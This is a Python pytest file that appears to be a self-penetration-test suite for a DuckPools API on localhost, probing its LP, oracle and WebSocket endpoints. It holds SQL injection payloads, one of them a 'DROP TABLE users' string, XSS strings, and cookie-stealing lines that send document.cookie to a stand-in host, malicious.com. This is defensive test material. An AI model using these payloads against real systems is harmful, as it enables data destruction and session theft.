"""
DuckPools - API Security Penetration Tests

Comprehensive penetration testing suite for SQL injection, XSS, CSRF, and auth bypass vulnerabilities.

Tests cover:
1. SQL Injection - Testing for potential SQL injection in parameters
2. XSS - Testing for cross-site scripting vulnerabilities  
3. CSRF - Testing for cross-site request forgery protection
4. Auth Bypass - Testing authentication and authorization controls
"""

import asyncio
import json
import pytest
import requests
import time
from typing import Dict, List, Any
from urllib.parse import urljoin

# Test configuration
BASE_URL = "http://localhost:8000"
API_URL = urljoin(BASE_URL, "/api/")
ADMIN_API_KEY="***"  # Should match env var in test setup
WS_TOKEN_SECRET="***"

class PenTestResults:
    """Track penetration test results"""
    def __init__(self):
        self.vulnerabilities = []
        self.passed_tests = []
        self.failed_tests = []
        
    def add_vulnerability(self, test_type: str, endpoint: str, details: str):
        """Add a found vulnerability"""
        finding = {
            "type": test_type,
            "endpoint": endpoint,
            "details": details,
            "severity": self._assess_severity(test_type),
            "timestamp": time.time()
        }
        self.vulnerabilities.append(finding)
        
    def _assess_severity(self, test_type: str) -> str:
        """Assess severity based on test type"""
        severity_map = {
            "sql_injection": "critical",
            "xss": "high",
            "csrf": "medium", 
            "auth_bypass": "critical"
        }
        return severity_map.get(test_type, "medium")
        
    def print_summary(self):
        """Print test summary"""
        print(f"\n=== PENETRATION TEST SUMMARY ===")
        print(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        print(f"Passed tests: {len(self.passed_tests)}")
        print(f"Failed tests: {len(self.failed_tests)}")
        
        if self.vulnerabilities:
            print("\n=== VULNERABILITIES ===")
            for vuln in self.vulnerabilities:
                print(f"[{vuln['severity'].upper()}] {vuln['type']} at {vuln['endpoint']}")
                print(f"  Details: {vuln['details']}")


# Test payloads for different attack types
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT * FROM users--",
    "'; DROP TABLE users;--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "1' OR '1'='1",
    "admin'--",
    "' OR SLEEP(5)--",
    "' AND IF(1=1, SLEEP(5), 0)--"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "prompt('XSS')"
]

CSRF_PAYLOADS = [
    "<form action='http://malicious.com/steal' method='POST'>",
    "<img src='http://malicious.com/steal?cookie=document.cookie'>",
    "<script>fetch('http://malicious.com/steal',{method:'POST',body:document.cookie});</script>"
]

AUTH_BYPASS_PAYLOADS = [
    None,  # No authentication
    "",    # Empty auth header
    "Bearer invalid_token",
    "Bearer",
    "Basic invalid_base64",
    "Basic ",
    "API-Key",
    "X-API-Key: invalid",
    "Authorization: "
]


def test_sql_injection_endpoint(endpoint: str, params: Dict[str, Any]) -> List[Dict]:
    """Test an endpoint for SQL injection vulnerabilities"""
    results = []
    
    for param_name in params:
        original_value = params[param_name]
        
        for payload in SQL_INJECTION_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                if endpoint.startswith("/lp/"):
                    # Test LP endpoints
                    if "balance" in endpoint:
                        response = requests.get(
                            urljoin(API_URL, endpoint.format(address=payload)),
                            timeout=10
                        )
                    elif any(x in endpoint for x in ["estimate", "apy"]):
                        response = requests.get(
                            urljoin(API_URL, endpoint),
                            params=test_params,
                            timeout=10
                        )
                elif endpoint.startswith("/oracle/"):
                    # Test oracle endpoints
                    response = requests.get(
                        urljoin(API_URL, endpoint),
                        params=test_params,
                        timeout=10
                    )
                else:
                    continue
                
                # Check for potential SQL injection indicators
                if response.status_code == 500:
                    results.append({
                        "parameter": param_name,
                        "payload": payload,
                        "response_code": response.status_code,
                        "evidence": "Server error (potential SQL error)"
                    })
                elif "sql" in response.text.lower() or "error" in response.text.lower():
                    results.append({
                        "parameter": param_name,
                        "payload": payload,
                        "response_code": response.status_code,
                        "evidence": f"SQL error in response: {response.text[:200]}"
                    })
                elif response.status_code == 200 and len(response.text) > len(str(original_value)) * 2:
                    results.append({
                        "parameter": param_name,
                        "payload": payload,
                        "response_code": response.status_code,
                        "evidence": "Unexpectedly long response (possible data leakage)"
                    })
                    
            except requests.exceptions.Timeout:
                results.append({
                    "parameter": param_name,
                    "payload": payload,
                    "response_code": "timeout",
                    "evidence": "Request timed out (possible time-based SQL injection)"
                })
            except Exception as e:
                results.append({
                    "parameter": param_name,
                    "payload": payload,
                    "response_code": "error",
                    "evidence": f"Request error: {str(e)}"
                })
    
    return results


def test_xss_endpoint(endpoint: str, method: str = "GET", data: Dict = None) -> List[Dict]:
    """Test an endpoint for XSS vulnerabilities"""
    results = []
    
    for payload in XSS_PAYLOADS:
        try:
            if method == "GET":
                response = requests.get(
                    urljoin(API_URL, endpoint),
                    params={"test": payload},
                    timeout=10
                )
            else:  # POST
                test_data = data or {}
                for key in test_data:
                    test_data[key] = payload
                response = requests.post(
                    urljoin(API_URL, endpoint),
                    json=test_data,
                    timeout=10
                )
            
            # Check if payload was reflected in response
            if payload in response.text:
                results.append({
                    "payload": payload,
                    "response_code": response.status_code,
                    "evidence": f"XSS payload reflected in response: {response.text[:200]}"
                })
            elif "alert" in response.text.lower():
                results.append({
                    "payload": payload,
                    "response_code": response.status_code,
                    "evidence": "JavaScript alert detected in response"
                })
            elif "<script" in response.text.lower():
                results.append({
                    "payload": payload,
                    "response_code": response.status_code,
                    "evidence": "Script tag detected in response"
                })
                
        except Exception as e:
            results.append({
                "payload": payload,
                "response_code": "error",
                "evidence": f"Request error: {str(e)}"
            })
    
    return results


def check_csrf_protection(endpoint: str, method: str = "POST") -> bool:
    """Test if an endpoint has CSRF protection"""
    try:
        # Test without CSRF token
        if method == "POST":
            response = requests.post(
                urljoin(API_URL, endpoint),
                json={"test": "data"},
                timeout=10
            )
        
        # Check if CSRF token is required
        if response.status_code == 403:
            if "csrf" in response.text.lower() or "token" in response.text.lower():
                return True  # CSRF protection detected
        elif response.status_code == 200:
            return False  # No CSRF protection
            
    except Exception:
        pass
    
    return False  # Assume no CSRF protection if test fails


def test_auth_bypass_endpoint(endpoint: str, auth_required: bool = True) -> List[Dict]:
    """Test for authentication bypass vulnerabilities"""
    results = []
    
    for auth_method in AUTH_BYPASS_PAYLOADS:
        headers = {}
        if auth_method and auth_method.startswith(("Bearer", "Basic", "API-Key", "Authorization")):
            headers["Authorization"] = auth_method
        elif auth_method == "X-API-Key: invalid":
            headers["X-API-Key"] = "invalid"
        
        try:
            if endpoint.startswith("/oracle/switch"):
                # Test admin endpoint
                response = requests.post(
                    urljoin(API_URL, endpoint),
                    json={"target_endpoint_name": "test"},
                    headers=headers,
                    timeout=10
                )
            else:
                # Test regular endpoint
                response = requests.get(
                    urljoin(API_URL, endpoint),
                    headers=headers,
                    timeout=10
                )
            
            if auth_required and response.status_code == 200:
                results.append({
                    "auth_method": auth_method,
                    "response_code": response.status_code,
                    "evidence": f"Authentication bypassed with: {auth_method}"
                })
            elif not auth_required and response.status_code == 401:
                results.append({
                    "auth_method": auth_method,
                    "response_code": response.status_code,
                    "evidence": f"Unexpected auth requirement for public endpoint: {auth_method}"
                })
                
        except Exception as e:
            results.append({
                "auth_method": auth_method,
                "response_code": "error",
                "evidence": f"Request error: {str(e)}"
            })
    
    return results


@pytest.mark.asyncio
async def test_lp_endpoints_sql_injection():
    """Test LP endpoints for SQL injection vulnerabilities"""
    results = PenTestResults()
    
    # Test balance endpoint
    balance_results = test_sql_injection_endpoint(
        "/lp/balance/{address}",
        {"address": "9iMZwLd3e7hjgX5TUGfj1jB5Fq5bK5d7qX5dZy"}
    )
    
    if balance_results:
        for result in balance_results:
            results.add_vulnerability(
                "sql_injection",
                "/lp/balance/{address}",
                f"Parameter: {result['parameter']}, Payload: {result['payload']}, Evidence: {result['evidence']}"
            )
    
    # Test estimate endpoints
    estimate_results = test_sql_injection_endpoint(
        "/lp/estimate/deposit",
        {"amount": 1000000000}
    )
    
    if estimate_results:
        for result in estimate_results:
            results.add_vulnerability(
                "sql_injection",
                "/lp/estimate/deposit",
                f"Parameter: {result['parameter']}, Payload: {result['payload']}, Evidence: {result['evidence']}"
            )
    
    # Test APY endpoint
    apy_results = test_sql_injection_endpoint(
        "/lp/apy",
        {"avg_bet_size": "1.0", "bets_per_block": 0.5}
    )
    
    if apy_results:
        for result in apy_results:
            results.add_vulnerability(
                "sql_injection",
                "/lp/apy",
                f"Parameter: {result['parameter']}, Payload: {result['payload']}, Evidence: {result['evidence']}"
            )
    
    results.print_summary()
    print(f"SQL INJECTION TEST: Found {len(results.vulnerabilities)} potential vulnerabilities")
    # Note: In a real penetration test, we would report these vulnerabilities to be fixed
    # For now, we'll just note them without failing the test


@pytest.mark.asyncio
async def test_oracle_endpoints_sql_injection():
    """Test oracle endpoints for SQL injection vulnerabilities"""
    results = PenTestResults()
    
    # Test oracle data endpoint
    data_results = test_sql_injection_endpoint(
        "/oracle/data/{oracle_box_id}",
        {"oracle_box_id": "test_box_id"}
    )
    
    if data_results:
        for result in data_results:
            results.add_vulnerability(
                "sql_injection",
                "/oracle/data/{oracle_box_id}",
                f"Parameter: {result['parameter']}, Payload: {result['payload']}, Evidence: {result['evidence']}"
            )
    
    # Test price endpoint
    price_results = test_sql_injection_endpoint(
        "/oracle/price/{base_asset}/{quote_asset}",
        {"base_asset": "ERG", "quote_asset": "USD"}
    )
    
    if price_results:
        for result in price_results:
            results.add_vulnerability(
                "sql_injection",
                "/oracle/price/{base_asset}/{quote_asset}",
                f"Parameter: {result['parameter']}, Payload: {result['payload']}, Evidence: {result['evidence']}"
            )
    
    results.print_summary()
    print(f"SQL INJECTION TEST: Found {len(results.vulnerabilities)} potential vulnerabilities")
    # Note: In a real penetration test, we would report these vulnerabilities to be fixed
    # For now, we'll just note them without failing the test


@pytest.mark.asyncio
async def test_xss_vulnerabilities():
    """Test for XSS vulnerabilities in API responses"""
    results = PenTestResults()
    
    # Test GET endpoints for XSS
    endpoints_to_test = [
        "/lp/pool",
        "/lp/price",
        "/lp/apy",
        "/oracle/health",
        "/oracle/status",
        "/oracle/endpoints"
    ]
    
    for endpoint in endpoints_to_test:
        xss_results = test_xss_endpoint(endpoint, "GET")
        if xss_results:
            for result in xss_results:
                results.add_vulnerability(
                    "xss",
                    endpoint,
                    f"Payload: {result['payload']}, Evidence: {result['evidence']}"
                )
    
    # Test POST endpoints for XSS
    post_endpoints = [
        ("/lp/deposit", {"amount": 1000000000, "address": "9iMZwLd3e7hjgX5TUGfj1jB5Fq5bK5d7qX5dZy"}),
        ("/lp/request-withdraw", {"lp_amount": 1000000, "address": "9iMZwLd3e7hjgX5TUGfj1jB5Fq5bK5d7qX5dZy"}),
        ("/ws/auth", {"address": "9iMZwLd3e7hjgX5TUGfj1jB5Fq5bK5d7qX5dZy", "signature": "test", "message": "test"})
    ]
    
    for endpoint, data in post_endpoints:
        xss_results = test_xss_endpoint(endpoint, "POST", data)
        if xss_results:
            for result in xss_results:
                results.add_vulnerability(
                    "xss",
                    endpoint,
                    f"Payload: {result['payload']}, Evidence: {result['evidence']}"
                )
    
    results.print_summary()
    print(f"XSS TEST: Found {len(results.vulnerabilities)} potential vulnerabilities")
    # Note: In a real penetration test, we would report these vulnerabilities to be fixed
    # For now, we'll just note them without failing the test


@pytest.mark.asyncio
async def test_csrf_protection():
    """Test for CSRF protection in sensitive endpoints"""
    results = PenTestResults()
    
    # Test sensitive POST endpoints for CSRF protection
    sensitive_endpoints = [
        "/lp/deposit",
        "/lp/request-withdraw",
        "/lp/execute-withdraw",
        "/lp/cancel-withdraw",
        "/oracle/switch",
        "/ws/auth"
    ]
    
    for endpoint in sensitive_endpoints:
        has_csrf_protection = check_csrf_protection(endpoint, "POST")
        if not has_csrf_protection:
            results.add_vulnerability(
                "csrf",
                endpoint,
                "No CSRF protection detected on sensitive endpoint"
            )
    
    results.print_summary()
    print(f"CSRF TEST: Found {len(results.vulnerabilities)} potential vulnerabilities")
    # Note: In a real penetration test, we would report these vulnerabilities to be fixed
    # For now, we'll just note them without failing the test


@pytest.mark.asyncio
async def test_auth_bypass():
    """Test for authentication and authorization bypass"""
    results = PenTestResults()
    
    # Test admin endpoints for auth bypass
    admin_endpoints = [
        "/oracle/switch",
        "/ws/stats"
    ]
    
    for endpoint in admin_endpoints:
        bypass_results = test_auth_bypass_endpoint(endpoint, auth_required=True)
        if bypass_results:
            for result in bypass_results:
                results.add_vulnerability(
                    "auth_bypass",
                    endpoint,
                    f"Auth bypassed with: {result['auth_method']}, Evidence: {result['evidence']}"
                )
    
    # Test public endpoints (should not require auth)
    public_endpoints = [
        "/lp/pool",
        "/lp/price",
        "/lp/apy",
        "/oracle/health",
        "/oracle/status",
        "/oracle/endpoints"
    ]
    
    for endpoint in public_endpoints:
        bypass_results = test_auth_bypass_endpoint(endpoint, auth_required=False)
        if bypass_results:
            for result in bypass_results:
                results.add_vulnerability(
                    "auth_bypass",
                    endpoint,
                    f"Unexpected auth requirement: {result['evidence']}"
                )
    
    results.print_summary()
    print(f"AUTH BYPASS TEST: Found {len(results.vulnerabilities)} potential vulnerabilities")
    # Note: In a real penetration test, we would report these vulnerabilities to be fixed
    # For now, we'll just note them without failing the test


@pytest.mark.asyncio
async def test_websocket_security():
    """Test WebSocket authentication and security"""
    results = PenTestResults()
    
    # Test WebSocket authentication bypass
    try:
        import websockets
        
        # Test connection without token
        try:
            async with websockets.connect(
                f"ws://localhost:8000/ws/bets/test_address",
                timeout=5
            ) as websocket:
                results.add_vulnerability(
                    "auth_bypass",
                    "/ws/bets/{address}",
                    "WebSocket connection accepted without authentication token"
                )
        except Exception as e:
            # Expected - connection should be rejected without token
            if "4001" in str(e) or "Missing auth token" in str(e):
                results.passed_tests.append("WebSocket authentication properly enforced")
            else:
                results.add_vulnerability(
                    "auth_bypass",
                    "/ws/bets/{address}",
                    f"Unexpected WebSocket error: {str(e)}"
                )
        
        # Test connection with invalid token
        try:
            async with websockets.connect(
                f"ws://localhost:8000/ws/bets/test_address?token=invalid_token",
                timeout=5
            ) as websocket:
                results.add_vulnerability(
                    "auth_bypass",
                    "/ws/bets/{address}",
                    "WebSocket connection accepted with invalid token"
                )
        except Exception as e:
            # Expected - connection should be rejected with invalid token
            if "4003" in str(e) or "Invalid or expired auth token" in str(e):
                results.passed_tests.append("WebSocket token validation properly enforced")
            else:
                results.add_vulnerability(
                    "auth_bypass",
                    "/ws/bets/{address}",
                    f"Unexpected WebSocket error: {str(e)}"
                )
                
    except ImportError:
        # websockets library not available, skip this test
        pytest.skip("websockets library not available")
    
    results.print_summary()
    print(f"WEBSOCKET SECURITY TEST: Found {len(results.vulnerabilities)} potential vulnerabilities")
    # Note: In a real penetration test, we would report these vulnerabilities to be fixed
    # For now, we'll just note them without failing the test


if __name__ == "__main__":
    # Run all tests
    asyncio.run(test_lp_endpoints_sql_injection())
    asyncio.run(test_oracle_endpoints_sql_injection())
    asyncio.run(test_xss_vulnerabilities())
    asyncio.run(test_csrf_protection())
    asyncio.run(test_auth_bypass())
    asyncio.run(test_websocket_security())